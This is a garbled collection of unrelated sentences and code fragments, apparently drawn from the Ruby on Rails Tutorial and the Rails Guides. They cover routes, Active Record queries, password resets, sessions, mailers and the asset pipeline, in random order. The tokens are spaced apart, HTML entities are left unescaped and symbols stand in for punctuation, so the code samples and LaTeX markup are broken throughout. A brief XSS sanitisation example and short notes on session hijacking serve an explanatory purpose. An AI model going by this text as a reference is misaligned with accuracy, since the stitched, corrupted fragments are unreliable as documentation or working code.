WARNING : Since `DateTime` is not DST-aware you can end up in a non-existing point in time with no warning or error telling you so .
To define the \ kode { update } action corresponding to the \ kode { edit } action in Listing ~ \ ref { code : password _ reset _ edit _ action } , we need to consider four cases : an expired password reset , a successful update , a failed update ( due to an invalid password ) , and a failed update ( which initially looks ``successful &apos; &apos; ) due to a blank password and confirmation .
Note that Listing ~ \ ref { code : delete _ link _ integration _ test } checks for the right delete links , including skipping the test if the user happens to be the admin ( which lacks a delete link due to Listing ~ \ ref { code : delete _ links } ) .
We &apos;ll cover all of these ideas in this chapter .
We will be deprecating the use of `render : text` in a future version ▖
Adding a test of the password reset mailer method ▖
&#124; test / models / comment _ test ▖ rb &#124; Testing harness for the comments model &#124;
&#124; DELETE &#124; / photos / : id &#124; photos # destroy &#124; delete a specific photo &#124;
Now reapply your patch on top of the latest changes :
Active Record provides several different ways of retrieving a single object .
* In Rails 4 ▖ 0 , a generic `ActionDispatch : : ParamsParser : : ParseError` exception is raised when `ParamsParser` fails to parse request params ▖
If the target file exists `atomic _ write` overwrites it and keeps owners and permissions ▖
We &apos;ll end by taking a first important step toward letting users sign up to our site .
The method `index _ by` generates a hash with the elements of an enumerable indexed by some key .
To accomplish this `atomic _ write` creates a temporary file ▖
To avoid this incompatibility , we &apos;ll standardize on all lower-case addresses , converting ``Foo @ ExAMPle ▖ CoM &apos; &apos; to ``foo @ example ▖ com &apos; &apos; before saving it to the database .
`find _ or _ create _ by` returns either the record that already exists or the new record ▖
See \ href { http : / / stackoverflow ▖ com / questions / 941594 / understand-rails-authenticity-token } { the Stack Overflow entry on the Rails authenticity token } if you &apos;re interested in the details of how this works .
Creating a new application at Heroku .
in Listing ~ \ ref { code : wrap } .
create app / assets / stylesheets / blorgh / comments ▖ css
# = &gt; &lt; input id = &quot; email &quot; name = &quot; email &quot; type = &quot; email &quot; / &gt;
$ git remote add mine git @ github ▖ com : &lt; your user name &gt; / rails ▖ git
Under the hood , this command executes the \ kode { drop \ _ table } command to remove the users table from the database .
# # # Associating Models
# git config --global core ▖ excludesfile &apos; ~ / ▖ gitignore _ global&apos;
use ActionDispatch : : Session : : CookieStore
All namespaces in the list must respond to the `eager _ load ! ` method .
A test for \ kode { followers } ▖
_ Make sure you do it yourself when you build other header fields with user input .
Here is the result :
Adding a feed instance variable to the \ kode { home } action .
This would then turn the above code for `set _ author` into this :
As implied by their generic names , the applications developed in the \ emph { Ruby on Rails Tutorial } are not specific to any particular kind of website ; although the final sample application will bear more than a passing resemblance to a certain popular \ href { http : / / twitter ▖ com / } { social microblogging site } ( a site which , coincidentally , was also originally written in Rails ) , the emphasis throughout the tutorial is on general principles , so you will have a solid foundation no matter what kinds of web applications you want to build .
Most languages provide a syntactic shortcut for this operation ; in Ruby ( and in C , C + + , Perl , Python , Java , etc ▖ ) , it appears as follows :
in Listing ~ \ ref { code : micropost _ user _ id _ validation } .
This creates a nested route for the comments , which is what the form requires .
# # # # select _ tag
The first step is to \ href { http : / / api ▖ heroku ▖ com / signup } { sign up for Heroku } ; after checking your email to complete the creation of your account , install the necessary Heroku software using the \ href { https : / / toolbelt ▖ heroku ▖ com / } { Heroku Toolbelt }
person ▖ valid ?
Second , we need to add \ kode { password } and \ kode { password \ _ confirmation } attributes , require the presence of the password , require that they match , and add an \ kode { authenticate } method to compare an encrypted password to the \ kode { password \ _ digest } to authenticate users .
Because Heroku comes with an installation of ImageMagick , the result is successful image resizing and upload in production , as seen in Figure ~ \ ref { fig : image _ upload _ production } .
We see here from the last example that the hash value for an undefined key is simply \ kode { nil } .
$ bundle exec rake test TEST = test / integration / users _ login _ test ▖ rb \ ╼ &gt; TESTOPTS = &quot; --name test _ login _ with _ valid _ information &quot;
The ╼ default value is true if this configuration is not set .
Listing ~ \ ref { code : layout _ links _ test } shows how we can use Rails integration tests to translate these steps into code , beginning with the \ kode { assert \ _ template } method to verify that the Home page is rendered using the correct view
* &#91; Railscast on Rack Middlewares &#93; ( http : / / railscasts ▖ com / episodes / 151-rack-middleware )
Once we define the proper associations , the resulting \ kode { @ micropost } variable will automatically have \ kode { user \ _ id } equal to its associated user .
object ▖ class _ eval do
The first step in our refactoring is to replace the user ~ \ kode { li } from Listing ~ \ ref { code : will _ paginate _ index _ view } with a \ kode { render } call ( Listing ~ \ ref { code : index _ view _ first _ refactoring } ) .
A database index works essentially the same way .
&lt; / body &gt;
NOTE : Defined in `active _ support / core _ ext / hash / conversions ▖ rb` .
Note here that we can use the \ kode { count } method \ emph { through } the association :
We &apos;ll discuss what this means in more detail starting in Section ~ \ ref { sec : bundler } .
Ruby supports class definition via the \ kode { class } keyword .
Happily , the first step is easy---completing the Sessions controller \ kode { create } action is a snap .
Once you call `save` upon that object it will be saved into the ╼ appropriate database table ▖
Add it to your `Gemfile` and run ╼ `bundle install` and you &apos;re ready to go .
This example pops up a message box ▖
In the production environment Sprockets uses the fingerprinting scheme outlined ╼ above ▖
The ╼ default error message for this option is _ &quot; must be equal to % { count } &quot; _ .
# # # Defining Multiple Resources at the Same Time
format ▖ html
Instead of declaring separate routes for your `index` , `show` , `new` , `edit` , `create` , `update` and `destroy` actions , a resourceful route declares them in a single line of code .
# # # # fields _ for
We &apos;ll use the standard Rails location for showing a user , which is \ kode { app / views / users / show ▖ html ▖ erb } .
= &gt; &quot; production &quot;
&lt; % = stylesheet _ link _ tag &quot; http : / / example ▖ com / main ▖ css &quot; % &gt;
Installing RubyGems should be easy once you install Ruby .
Code for the signin form .
Now that we &apos;ve added support for all relevant micropost actions , in this section we &apos;ll make it possible for microposts to include images as well as text .
Overview : How the Pieces Fit Together
HTTP / 1 ▖ 1 201 Created
# = &gt; { : c = &gt; 3 , : a = &gt; 1 }
Putting the two cases together gives the tests in Listing ~ \ ref { code : follow _ button _ tests } .
RedCloth ▖ new ( &quot; &lt; a href = &apos; javascript : alert ( 1 ) &apos; &gt; hello &lt; / a &gt; &quot; , &#91; : filter _ html &#93; ) ▖ to _ html
In the present case , since we are still in the Users controller but want to paginate \ emph { microposts } instead , we &apos;ll pass an explicit \ kode { @ microposts } variable to \ kode { will \ _ paginate } .
A sample password reset email from the server log .
A model of followed users through active relationships .
This can be changed to force all files to be recompiled .
Because we used the \ kode { image \ _ tag } helper in Listing ~ \ ref { code : signup _ button } , Rails will automatically find any images in the \ kode { app / assets / images / } directory using the asset pipeline ( Section ~ \ ref { sec : sass _ and _ the _ asset _ pipeline } ) .
As we saw in the last chapter , it &apos;s possible to develop the skeleton of a Rails application , and even start testing it , with essentially no knowledge of the underlying Ruby language .
Making it ╼ accessible at `http : / / localhost : 3000 / blog` when the application runs with `rails ╼ server` .
Initially , this might take some getting used to , but the benefits are significant .
Rails adds the `therubyracer` gem to the generated `Gemfile` in a ╼ commented line for new apps and you can uncomment if you need it ▖ ╼
The ` : in` option has an alias called ` : within` that you can ╼ use for the same purpose , if you &apos;d like to ▖
microposts
xml ▖ ttl &quot; 40 &quot;
def summary
module _ path = module _ name ▖ underscore
Let &apos;s take a look at a couple of the examples to see how they can be improved :
# # # # datetime _ select
Building the micropost through the User association doesn &apos;t fix the security problem of having an accessible \ kode { user \ _ id } , and
To see ╼ your application in action , open a browser window and navigate to ╼ &lt; http : / / localhost : 3000 &gt; ▖
```markdown
Defaults to ` / assets` .
You can learn more about validations in the &#91; Active Record Validations ╼ guide &#93; ( active _ record _ validations ▖ html ) .
Improving engine functionality
redirect _ to articles _ path
Blorgh : : Article ▖ class _ eval do
$ ruby -v
* `add _ to _ prepare _ blocks` The block for every `config ▖ to _ prepare` call in the application , a railtie or engine is added to the `to _ prepare` callbacks for Action Dispatch which will be run per request in development , or before the first request in production .
$ bin / rake db : migrate
Imagine you have a series of users that you would like to display and provide a ╼ form on that same page to create a new user ▖
following
`beginning _ of _ hour` is aliased to `at _ beginning _ of _ hour` .
The corresponding email appears in the server log and should look something like Listing ~ \ ref { code : password _ reset _ email } .
We &apos;ll define an analogous \ kode { \ _ micropost ▖ html ▖ erb } partial so that we can use the same technique on a collection of microposts as follows :
# # # # `except` and `except !
``Ruby on Rails Tutorial Sample App &apos; &apos; is common to all three titles .
def compress ( string )
Note that we don &apos;t have explicit render at the end of the index action in accordance with &quot; convention over configuration &quot; principle ▖
Section ~ \ ref { sec : deleting _ users } adds user deletion to the sample app , taking care to restrict its use to a special class of administrative users .
So please ╼ start using the more precise ` : plain` , ` : html` , and ` : body` options instead .
And in `production ▖ rb` :
% subsection css _ revisited ( end ) ╼ ╼ % section other _ data _ structures ( end ) ╼ ╼ \ section { Ruby classes } % ( fold ) ╼ \ label { sec : ruby _ classes } ╼ ╼
( Writing a test for the error messages is left as an exercise ( Section ~ \ ref { sec : exercises _ a _ test _ for _ invalid _ submission } ) ▖ )
The subsequent code creates an empty example user and then fills in the name and email address by assigning directly to the corresponding attributes ( assignments made possible by the \ kode { attr \ _ accessor } line in Listing ~ \ ref { code : example _ user } ) .
&quot; hello &quot; ▖ at ( 0 ) # = &gt; &quot; h &quot;
--------------
To define an event for these hooks , use the block syntax within a `Rails : : Application` , `Rails : : Railtie` or `Rails : : Engine` subclass :
It does this by checking whether another process has made changes to a record since it was opened ▖
Rails offers two different ways to declare a many-to-many relationship between models ▖
format ▖ html { redirect _ to @ user , notice : &apos; User was successfully created ▖ &apos;
As with the console , \ texttt { development } is the default environment for the Rails server , but you can also run it in a different environment :
The users index page should now be working , appearing as in Figure ~ \ ref { fig : user _ index _ pagination } .
in the hello app ( Listing ~ \ ref { code : hello _ root _ route } ) , the code
has _ one Association Diagram &#93; ( images / has _ one ▖ png )
You &apos;ll find that it &apos;s the same as when it was only an ╼ engine .
* Rails 4 ▖ 0 deprecated `ActionController : : Request` in favor of `ActionDispatch : : Request` .
Consider these models :
You can also use this method to query for multiple objects ▖
For example , Action Pack uses this method to load the class that provides a certain session store :
Here is an example for version 3 ▖ 0 ▖ 4 :
( Note that the key \ kode { : success } is a symbol , but embedded Ruby automatically converts it to the string \ kode { &quot; success &quot; } before inserting it into the template ▖ )
The ` : in` option has an ╼ alias called ` : within` that you can use for the same purpose , if you &apos;d like to ▖ ╼
╼ \ end { equation }
You may recall from Section ~ \ ref { sec : git _ commands } that we used the Git command \ kode { git commit -a -m &quot; Message &quot; } , with flags for ``all changes &apos; &apos; ( \ kode { -a } ) and a message ( \ kode { -m } ) .
invoke scss
These are \ emph { string literals } ( also , amusingly , called \ emph { literal strings } ) , created using the double quote character ~ \ kode { &quot; } .
For example , if a part has many assemblies , but the actual name of the model containing assemblies is `Gadget` , you &apos;d set things up this way :
To make our remember token even more secure , we &apos;ll plan to change it every time a user creates a new session , which means that any \ href { http : / / en ▖ wikipedia ▖ org / wiki / Session _ hijacking } { hijacked sessions } ---in which an attacker uses a stolen cookie to sign in as a particular user---will expire the next time a user signs in .
The user \ kode { edit } action .
# # # Sending Multipart Emails
Without them he couldn &apos;t send a friend request over POST ▖
# # = &gt; &lt; label for = &quot; article _ title &quot; class = &quot; title _ label &quot; &gt; A short title &lt; / label &gt;
# # # Fixed-width Font
Adding a resource to get the standard RESTful actions for sessions .
( Compare to the code in Section ~ \ ref { sec : rendering _ microposts } , where we saw that
So , you can use ╼ `deliver _ later` now to send emails , and when you later decide to start sending ╼ them from a background job , you &apos;ll only need to set up Active Job to use a queueing ╼ backend ( Sidekiq , Resque , etc ) .
rspec guard added to Guardfile , feel free to edit it
This file could include a list of ╼ all the required files in order , or a simple `require _ tree` directive .
This tells the application that you still want to perform a `GET` request to the ╼ `index` action of this controller , but you want to use the engine &apos;s route to get ╼ there , rather than the application &apos;s one .
in Listing ~ \ ref { code : signin _ create _ user _ instance } and
&lt; % = video _ tag &quot; movie ▖ ogg &quot; % &gt;
also generates a controller called \ kode { static \ _ pages \ _ controller ▖ rb } .
As with labels , text fields , password fields , and submit buttons , checkboxes can be created with a Rails helper method .
Download new commits and branches from the official repository :
Any one request will check out a connection the first time it requires access to the database , after which it will check the connection back in , at the end of the request , meaning that the additional connection slot will be available again for the next request in the queue .
Add &apos; multi _ json &apos; to your Gemfile ▖
Creates a micropost associated with \ kode { user }
here we &apos;ll use the corresponding \ kode { assert \ _ difference } method :
This is normal for a collection of static pages---the REST architecture isn &apos;t the best solution to every problem .
person ▖ errors ▖ to _ a
You can prefix the queue name for all your jobs using ╼ `config ▖ active _ job ▖ queue _ name _ prefix` in `application ▖ rb` :
That file is generated by the `rails` command and has instructions in comments .
Finally , note that we have taken this opportunity to add a count of the current number of microposts :
We can change features such as links on the layouts based on login status .
That syntactic sugar is used a lot in Rails to avoid positional arguments where there would be too many , offering instead interfaces that emulate named parameters ▖
( We &apos;ll learn more about controller actions starting in Section ~ \ ref { sec : mvc _ in _ action } ▖ )
Adding the routes for user relationships .
Error messages for a failed micropost creation .
&lt; % = f ▖ label : title , &apos; Title &apos; % &gt; :
&#124; Configuration &#124; Description &#124;
This adds a form on the `Article` show page that creates a new comment by ╼ calling the `CommentsController` `create` action ▖
Session hijacking was widely publicized by the \ href { http : / / codebutler ▖ com / firesheep } { Firesheep } application , which showed that remember tokens at many high-profile sites were visible when connected to public Wi-Fi networks .
A mockup of micropost image upload ( with an uploaded image ) .
adapter : sqlite3
Then navigate to \ href { http : / / localhost : 3000 / static _ pages / home } { / static \ _ pages / home } ( Figure ~ \ ref { fig : raw _ home _ view } ) .
We can use it as follows :
* * `ActionDispatch : : RequestId` * *
# This can be meaningful for authentication code .
With the code in Listing ~ \ ref { code : feed _ final } , our status feed is now complete .
Listing ~ \ ref { code : image _ uploader _ production } uses the \ kode { production ? }
Adding the \ kode { annotate } gem to the \ kode { Gemfile } .
# # # `multiple _ of ?
Ruby supports method definition via the \ kode { def } keyword .
Rails uses this method in a single place , also in the routing code ▖
A test of the users index , including pagination ▖
You can also add bullet points :
A test for an expired password reset ▖
The default matcher for compiling files includes `application ▖ js` , ╼ `application ▖ css` and all non-JS / CSS files ( this will include all image assets ╼ automatically ) from `app / assets` folders including your gems :
Returns a select tag with options for each of the hours 0 through 23 with the current hour selected .
In order to test destroying microposts properly , we first need to capture a given user &apos;s posts in a local variable , and then destroy the user .
You will have to remove ╼ the comment operator on that line to later enable the asset pipeline :
You can also include all JavaScript files in the `app / assets / javascripts` directory using ` : all` as the source .
In the event that the collection is empty , `render` will return nil , so it should be fairly simple to provide alternative content .
Used in Rails for when the `scaffold` generator is run ▖
NOTE : Defined in `active _ support / core _ ext / object / json ▖ rb` .
By default , in a \ kode { has \ _ many : through } association Rails looks for a foreign key corresponding to the singular version of the association .
In broad strokes , this involves deciding what should be sent as the response and calling an appropriate method to create that response ▖
&#124; `deliveries` &#124; Keeps an array of all the emails sent out through the Action Mailer with delivery _ method : test ▖
has _ many : comments , dependent : : destroy
╼ \ end { enumerate } ╼ ╼ % subsection a _ problem _ with _ the _ data _ model ( end ) ╼ ╼ \ subsection { User / relationship associations } % ( fold ) ╼ \ label { sec : relationship _ user _ associations } ╼ ╼
Returning to the console , we can see the effect of \ kode { has \ _ secure \ _ password } from Listing ~ \ ref { code : password _ implementation } by looking at the \ kode { password \ _ digest } attribute :
hello , world
You do not need to explicitly use the ` : controller` and ` : action` symbols within a route ▖
To use them , simply add `gem &apos; responders &apos; , &apos; ~ &gt; 2 ▖ 0 &apos; ` to your Gemfile ▖
as seen in Listing ~ \ ref { code : user _ pages _ spec } .
Destroying a session ( user signout ) .
An updated test for the Home page &apos;s title ▖
This means that we can make a new user object without any further work :
An alternate implementation of the \ kode { before \ _ save } callback ▖
The default error message for this helper is _ &quot; must be accepted &quot; _ .
Active Record provides several options for finding objects .
class _ eval &lt; &lt; -EOT , _ _ FILE _ _ , _ _ LINE _ _
# # # # Qualified Constant Names
&quot; activation _ digest &quot;
# # # # `transform _ keys` and `transform _ keys !
╼ * scope .
This means we can still undo the changes using the \ kode { checkout } command with the \ kode { -f } flag to force overwriting the current changes :
The tests for signin failure .
We &apos;re now in a position to remember a logged-in user , which we &apos;ll do by adding a \ kode { remember } helper to go along with \ kode { log \ _ in } , as shown in Listing ~ \ ref { code : log _ in _ with _ remember } .
In this case , the partial is ` _ product` , and within the ` _ product` partial , you can refer to `product` to get the instance that is being rendered .
To define the named routes , we need to replace rules such as
Rails 4 automatically adds the `sass-rails` , `coffee-rails` and `uglifier` ╼ gems to your Gemfile , which are used by Sprockets for asset compression :
As with account activation emails ( Section ~ \ ref { sec : account _ activation _ mailer } ) , we can preview password reset emails using the Rails email previewer .
Now , let &apos;s update the `app / views / articles / new ▖ html ▖ erb` view to use this new ╼ partial , rewriting it completely :
Active Record will perform queries on the database for you and is compatible with most database systems ( MySQL , PostgreSQL and SQLite to name a few ) ▖
/ / = require tickets
has _ one : account ,
as shown in Listing ~ \ ref { code : current _ user _ wrong } .
&lt; p &gt;
Call the `find` method and pass in an array of primary keys ▖
If you find yourself getting confused , try pushing forward to the end ; then , read the section a second time through to see if things are clearer .
\ label { fig : page _ flow _ home _ page _ feed _ mockup } } ╼ \ end { figure } ╼ ╼ ╼ \ section { The Relationship model } % ( fold ) ╼ \ label { sec : the _ relationship _ model } ╼ ╼
Once you &apos;ve added your public key , click on ``Create &apos; &apos; to \ href { https : / / bitbucket ▖ org / repo / create } { create a new repository } , as shown in Figure ~ \ ref { fig : create _ first _ repository } .
* A file at `lib / blorgh / engine ▖ rb` , which is identical in function to a ╼ standard Rails application &apos;s `config / application ▖ rb` file :
# gem &apos; rb-notifu &apos; , &apos; 0 ▖ 0 ▖ 4&apos;
The awesome \ href { http : / / www ▖ rubular ▖ com / } { Rubular } regular expression editor .
&#91; &#91; 1 , 2 &#93; , &#91; 2 , 3 &#93; , &#91; 3 , 4 &#93; &#93; ▖ sum # = &gt; &#91; 1 , 2 , 2 , 3 , 3 , 4 &#93;
* `add _ generator _ templates` Finds templates for generators at `lib / templates` for the application , railties and engines and adds these to the `config ▖ generators ▖ templates` setting , which will make the templates available for all generators to reference .
Using the \ kode { join } method ( Section ~ \ ref { sec : arrays _ and _ ranges } ) , we can create a string composed of the ids by joining them on comma-space :
redirect _ to articles _ path
A mockup of the user following page ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / following _ mockup _ bootstrap-full ▖ png } { ( full size ) }
* Converts HEAD requests to `GET` requests and serves them as so .
* ` : title` specifies the title of the link ▖
end
A mockup of a ``remember me &apos; &apos; checkbox .
# # # `length`
next _ week
A \ kode { Gemfile } for the sample app , including Spork .
# # # # Do Any Associated Objects Exist ?
Files in these directories are ( even post-3 ▖ 0 ) automatically served up via requests to http : / / example ▖ com / stylesheets , etc .
Check it out :
date ▖ end _ of _ minute # = &gt; Mon Jun 07 19 : 55 : 59 + 0200 2010
# # # Web Console
If you set this to ` _ northwest` , then the Customer class will look for `customers _ northwest` as its table ▖
CSS Injection is explained best by a well-known worm , the &#91; MySpace Samy worm &#93; ( http : / / namb ▖ la / popular / tech ▖ html ) .
` : shallow _ path` prefixes member paths with the specified parameter :
&lt; option value = &quot; 5 &quot; &gt; Japan &lt; / option &gt;
class Person
# # # # Creating Foreign Keys for `belongs _ to` Associations
Then the spec says that when you visit the Home page at \ kode { / static \ _ pages / home } , the content should contain the words ``Sample App &apos; &apos; .
Note here that both actions make an \ emph { explicit } call to \ kode { render } , in this case rendering a view called \ kode { show \ _ follow } , which we must create .
Date ▖ new ( 2010 , 2 , 28 ) ▖ advance ( months : 1 , days : 1 )
The \ texttt { cookies ▖ permanent } method , which creates ``permanent &apos; &apos; cookies with an expiration \ texttt { 20 ▖ years ▖ from \ _ now } , gives yet another example of this practice through one of Rails &apos; \ emph { time helpers } , which are methods added to \ texttt { Fixnum } ( the base class for integers ) :
The result appears in Figure ~ \ ref { fig : home _ page _ follow _ stats } .
A test for validation of the \ kode { email } attribute ▖
* FROM &quot; articles &quot; WHERE trashed = 0
In Rails , the principal importance of instance variables is that they are automatically available in the views , but in general they are used for variables that need to be available throughout a Ruby class .
The optimal method really depends on your needs ; if you expect a \ emph { large } number of static pages , using a Static Pages controller can get quite cumbersome , but in our sample app we &apos;ll only need a few .
A summary of user / micropost association methods .
# # # # # `build _ association ( attributes = { } ) `
In Chapter ~ \ ref { cha : filling _ in _ the _ layout } , we ended with a stub page for creating new users ( Section ~ \ ref { sec : user _ signup } ) .
* Your text editor : Most text editors ( such as TextMate ) , default to saving ╼ files as UTF-8 ▖
&#124; POST &#124; / photos &#124; photos # create &#124; images _ path &#124;
* Literals like `nil` , `false` , `true` , `self` .
# # # Stand-Alone Active Support
&lt; % = link _ to &apos; My Blog &apos; , controller : &apos; articles &apos; % &gt;
In our case , we expect the \ kode { full \ _ title } helper to be used on all the site &apos;s pages , and Rails has a special helper file for this case : \ kode { app / helpers / application \ _ helper ▖ rb } .
rm &lt; file &gt;
We have no notion of logging in or out , and no way to prevent any user from performing any operation .
calls the \ kode { find \ _ by } method the first time \ kode { current \ _ user } is called , but on subsequent invocations returns \ kode { @ current \ _ user } without hitting the database
╼ ╼ THE SOFTWARE IS PROVIDED &quot; AS IS &quot; , WITHOUT WARRANTY OF ANY KIND , EXPRESS OR ╼ IMPLIED , INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY , ╼ FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT .
# = &gt; &lt; input id = &quot; token &quot; name = &quot; token &quot; type = &quot; hidden &quot; value = &quot; VUBJKB23UIVI1UU1VOBVI @ &quot; / &gt;
In either case , when you finish the \ emph { Ruby on Rails Tutorial } you will be in a position to benefit from the many more advanced books , blogs , and screencasts that are part of the thriving programming educational ecosystem
If you are not using STI , try an analogous keyword like &quot; context &quot; , that may still accurately describe the data you are modeling .
And here &apos;s how our app looks so far :
as seen in Listing ~ \ ref { code : user _ respond _ to _ password } .
The complete ( but not-yet-working ) \ kode { sign \ _ in } function .
An index for this association is also created on this column ▖ ╼
* How to define a custom Middleware stack .
For example , you might call a partial like this :
config ▖ autoload _ paths + = % W ( # { config ▖ root } / extras )
&lt; &lt; EOS ▖ indent ( 2 )
&#124; &#124; 415 &#124; : unsupported _ media _ type &#124;
By default , before filters apply to \ emph { every } action in a controller , so here we restrict the filter to act only on the \ kode { : edit } and \ kode { : update } actions by passing the appropriate \ kode { : only } options hash .
If you then forget ( or pretend to forget ) your password , you can reset it as developed in Section ~ \ ref { sec : password _ reset } ( Figure ~ \ ref { fig : reset _ email _ production } ) .
# # # Spring
The \ kode { belongs \ _ to } relationship between a micropost and its associated user .
&lt; th &gt; Summary &lt; / th &gt;
For Apache :
Signed cookies are &quot; secure &quot; in that they are verified to have been generated by your app and are tamper-proof ▖
In this section , we &apos;ll be working mainly in the \ kode { app / controllers } and \ kode { app / views } directories .
( We &apos;ll learn more about the strange \ kode { ? } - \ kode { : } notation in Section ~ \ ref { sec : remember _ me _ checkbox } ▖ )
months _ since
d ▖ end _ of _ quarter # = &gt; Wed , 30 Jun 2010
A test for the About page ▖
Then run \ kode { bundle install } as usual :
Happily , Rails has some facilities to help you recover .
The result of submitting a micropost with an image .
* `config ▖ assets ▖ css _ compressor` defines the CSS compressor to use ▖
&quot; favicon ▖ ico &quot; : &quot; favicona9c641bf2b81f0476e876f7c5e375969 ▖ ico &quot; , &quot; my _ image ▖ png &quot; :
( As with \ kode { header } , the \ kode { footer } tag is new in HTML5 ▖ )
You can also use root inside namespaces and scopes as well ▖
* FROM addresses
So this example for rendering all the products :
This involves editing the \ kode { micropost \ _ params } method , as shown in Listing ~ \ ref { code : micropost _ params _ picture } .
( We &apos;ll discuss inheritance briefly in Section ~ \ ref { sec : inheritance _ hierarchies } and cover both subjects in more detail in Section ~ \ ref { sec : ruby _ classes } ▖ )
This step is optional , but deploying early and often allows us to catch any deployment problems early in our development cycle .
Date : Sun , 24 Jan 2010 09 : 25 : 18 GMT
&lt; % = stylesheet _ link _ tag &quot; main &quot; , &quot; columns &quot; % &gt;
* If `value` is an array there &apos;s a recursive call with `key` as ` : root` , and `key` singularized as ` : children` .
&#124; ------------------- &#124; ---------------- &#124; -------------------------------- &#124;
To see demonstrations of other engines , check out ╼ &#91; Devise &#93; ( https : / / github ▖ com / plataformatec / devise ) , an engine that provides ╼ authentication for its parent applications , or ╼ &#91; Forem &#93; ( https : / / github ▖ com / radar / forem ) , an engine that provides forum ╼ functionality ▖
And for saved and non-destroyed objects , how can we retrieve users from the database ?
validates : orders _ count , presence : true
This time , although we &apos;ll defer the actual pages to Section ~ \ ref { sec : following _ and _ followers _ pages } , we &apos;ll make the routes now , as seen in Listing ~ \ ref { code : following _ followers _ actions _ routes } .
Deeply-nested resources quickly become cumbersome ▖
david = User ▖ find _ by ( name : &apos; David &apos; )
# See http : / / help ▖ github ▖ com / ignore-files / for more about ignoring files .
as shown in Listing ~ \ ref { code : user _ signin _ test _ valid _ information } .
The Asset Pipeline
Save the activation digest to the database , and then send an email to the user with a link containing the activation token and user &apos;s email address
Note that we expect to redirect users to the root path instead of the login path because a user trying to edit a different user would already be logged in .
If enabled , Active Record will create up to `1000` prepared statements per database connection by default ▖
Rails uses internal attributes in a few spots , for examples for views :
Client ▖ where ( created _ at : ( Time ▖ now ▖ midnight - 1 ▖ day ) ▖ .
Meanwhile , the \ kode { member } method arranges for the routes to respond to URLs containing the user id .
Verify by running the test suite that the new code is still valid .
date = Date ▖ new ( 2010 , 6 , 7 )
Indeed , it had better be OK , because with bcrypt &apos;s \ href { https : / / en ▖ wikipedia ▖ org / wiki / Salt _ % 28cryptography % 29 } { salted hashes } there &apos;s no way for us to tell if two users &apos; passwords match .
* The `test` environment is used when running automated tests .
Note the use of the \ kode { patch } method to issue a \ texttt { PATCH } request , which follows the same pattern as \ kode { get } , \ kode { post } , and \ kode { delete } .
The missing directory and file are back .
= = = = = = = = = = = = = = = = = = = = = = = = = = = = =
Each method is a request to perform an operation on the resource ▖
The trick to doing that is to format the ╼ email address in the format ` &quot; Full Name &lt; email &gt; &quot; ` .
This involves opening the \ kode { Gemfile } with a text editor .
This request would make user 17 an admin , which would be a potentially serious security breach .
If we instead stored an unhashed token , an attacker with access to the database could send a reset request to the user &apos;s email address and then use the token and email to visit the corresponding password reset link , thereby gaining control of the account .
In fact , it will turn out not to be important that \ kode { authenticate } returns the user itself ; all that will matter is that it returns a value that is \ kode { true } in a boolean context .
* `references`
Client ▖ where ( &quot; orders _ count &gt; 10 &quot; ) ▖ order ( : name ) ▖ reverse _ order
NOTE : Active Job &apos;s default behavior is to execute jobs &apos; : inline &apos; ▖
Client ▖ exists ?
Then , ╼ ` @ article ▖ save` is responsible for saving the model in the database ▖
Lowering the barrier
ults of \ kode { rails routes } to \ kode { grep } , list all the routes associated with the Users resource ▖ Do the same for Sessions ▖ How many routes does each resource have ? \ emph { Hint } : Refer to the \ href { https : / / www ▖ learnenough ▖ com / command-line-tutorial # sec-grepping } { section on grep } in \ lecl ▖ ╼ % = &lt; span class = &apos; exercise &apos; id = &apos; ex-061c5c &apos; &gt; &lt; / span &gt; ╼ \ end { enumerate } ╼ ╼ % subsection sessions _ controller ( end ) ╼ ╼ \ subsection { Login form } % ( fold ) ╼ \ label { sec : login _ form } ╼ ╼
if loaded ?
belongs _ to : customer , - &gt; { where active : true }
create _ table : suppliers do &#124; t &#124;
╼ = &gt; Sat , 02 Jan 2010 03 : 39 : 14 UTC + 00 : 00
&#124; GET &#124; / magazines / : magazine _ id / ads &#124; ads # index &#124; display a list of all ads for a specific magazine &#124;
Can you follow what they &apos;re testing ?
adapter : mysql2
It uses the same syntax and options as `ActiveRecord : : Base ▖ find` ▖ ╼ ╼
Start the console at the command line as follows :
COMMIT
# # # Internal Middleware Stack
( The benefit of using an email field is that some systems treat it differently from a text field ; for example , the code \ kode { type = &quot; email &quot; } will cause some mobile devices to display a special keyboard optimized for entering email addresses ▖ )
rails g model user name : string
In the above case , ╼ the file is using the `require` and the `require _ tree` directives ▖
The purpose is to get a high-level overview of Ruby on Rails programming ( and web development in general ) by rapidly generating an application using \ emph { scaffold generators } .
* `config ▖ logger` accepts a logger conforming to the interface of Log4r or the default Ruby `Logger` class ▖
You can also cache multiple stylesheets into one file , which requires less HTTP connections and can better be compressed by gzip ( leading to faster transfers ) ▖
We &apos;ll get these buttons working soon enough---in fact , we &apos;ll do it two ways , the standard way ( Section ~ \ ref { sec : a _ working _ follow _ button _ the _ standard _ way } ) and using Ajax ( Section ~ \ ref { sec : a _ working _ follow _ button _ with _ ajax } ) ---but first we &apos;ll finish the HTML interface by making the following and followers pages .
╼ $ rails generate controller FooBars baz quux
* `increment _ counter`
Because of the way Ruby handles assignments inside objects , without \ kode { self } the assignment would create a \ emph { local } variable called \ kode { remember \ _ token } , which isn &apos;t what we want .
# = &gt; &quot; sample % 5B % 5D = 3 ▖ 4 &amp; sample % 5B % 5D = -45 ▖ 6 &quot;
The next examples do exactly the same , only in very uncommon places :
Option ` : dependent = &gt; : restrict` has been removed from `belongs _ to` ▖
# # # # # `collection _ singular _ ids`
As seen in Listing ~ \ ref { code : mail _ account _ activation } , the \ kode { mail } method also takes a \ kode { subject } key , whose value is used as the email &apos;s subject line .
&#124; --------- &#124; ---------------- &#124; ----------------- &#124; -------------------- &#124;
You can also specify a special size tag , in the format &quot; { width } x { height } &quot; :
The picture format validation .
By the way , it &apos;s worth noting that \ kode { rails g } is a shortcut for \ kode { rails generate } , which is only one of several shortcuts supported by Rails ( Table ~ \ ref { table : shortcuts } ) .
* Does the change actually work ?
SELECT * FROM clients WHERE ( clients ▖ first _ name = &apos; Andy &apos; ) LIMIT 1
If the response is a full-blown view , Rails also does some extra work to wrap the view in a layout and possibly to pull in partial views ▖
Usually it happens because of a fundamental misunderstanding of the way that `render` works .
This construction more closely follows the hash notation in other languages ( such as JavaScript ) and enjoys growing popularity in the Rails community .
╼ $ rake db : rollback
